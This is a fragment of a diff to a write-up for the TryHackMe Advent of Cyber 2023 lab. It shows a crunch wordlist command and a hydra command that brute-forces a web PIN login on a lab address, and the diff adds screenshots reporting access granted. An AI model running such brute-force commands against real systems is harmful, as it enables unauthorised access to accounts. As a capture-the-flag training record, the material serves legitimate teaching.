@@ -16,3 +16,8 @@ crunch 3 3 0123456789ABCDEF -o 3digits.txt
 hydra -l '' -P 3digits.txt -f -v 10.10.174.107 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
 ![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/72875a73-ea57-4b6f-9363-97fc988a72f8)
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/fcd09e81-2474-4ea7-8616-0ebaf2f758c5)
+
+Acces granted
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/64d6ae96-ecc6-4307-b6e1-4cc05a1ccd55)
+
